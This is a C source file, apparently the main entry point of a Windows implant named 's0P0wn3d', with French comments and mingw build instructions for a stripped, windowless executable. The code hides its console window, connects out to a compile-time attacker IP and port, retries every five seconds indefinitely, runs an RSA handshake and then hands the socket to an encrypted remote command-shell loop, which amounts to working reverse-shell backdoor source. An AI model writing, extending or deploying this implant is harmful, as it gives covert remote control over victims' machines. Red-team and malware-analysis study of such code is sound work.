/*
 * main.c — Point d'entrée de l'implant s0P0wn3d
 *
 * Responsabilité unique : initialiser Winsock, gérer la boucle
 * de connexion TCP et orchestrer le handshake + shell.
 * Toute la logique est déléguée à crypto.c et shell.c.
 *
 * Compilation :
 *   x86_64-w64-mingw32-gcc -o implant.exe main.c aes.c crypto.c shell.c
 *   -DCLIENT_IP=\"<ip>\" -DCLIENT_PORT=<port> -DWAIT_FOR_CLIENT
 *   -lws2_32 -lbcrypt -mwindows -static -s -O2
 *
 * MITRE ATT&CK :
 *   T1059.003 — Windows Command Shell
 *   T1071.001 — Application Layer Protocol
 *   T1573.002 — Asymmetric Cryptography
 */

/* winsock2.h doit précéder windows.h */
#include <winsock2.h>
#include <windows.h>

#include <string.h>

#include "crypto.h"
#include "shell.h"

/* Pour MSVC uniquement — MinGW utilise -lws2_32 -lbcrypt */
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#endif

/* ================================================================
 * Paramètres de compilation
 * ================================================================ */

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
#define CLIENT_IP   (char *)"0.0.0.0"
#define CLIENT_PORT (int)0
#endif

/* ================================================================
 * Point d'entrée
 * ================================================================ */

int main(void)
{
    /* Vérification des paramètres de compilation */
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0)
        return 1;

    /* Masquer la fenêtre console si elle existe */
    HWND console = GetConsoleWindow();
    if (console)
        ShowWindow(console, SW_HIDE);

    /* Initialisation Winsock */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    struct sockaddr_in server_addr;
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(CLIENT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(CLIENT_IP);

    /*
     * Boucle de connexion.
     * Sans WAIT_FOR_CLIENT : une seule tentative puis exit.
     * Avec WAIT_FOR_CLIENT : retry toutes les 5s indéfiniment.
     */
    while (1) {
        SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
            closesocket(sock);
#ifndef WAIT_FOR_CLIENT
            break;
#endif
            Sleep(5000);
            continue;
        }

        /* Handshake RSA → génère et échange SESSION_KEY */
        if (rsa_handshake(sock) == 0)
            shell_loop(sock);   /* boucle commandes/réponses chiffrées */

        closesocket(sock);

#ifndef WAIT_FOR_CLIENT
        break;
#endif
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
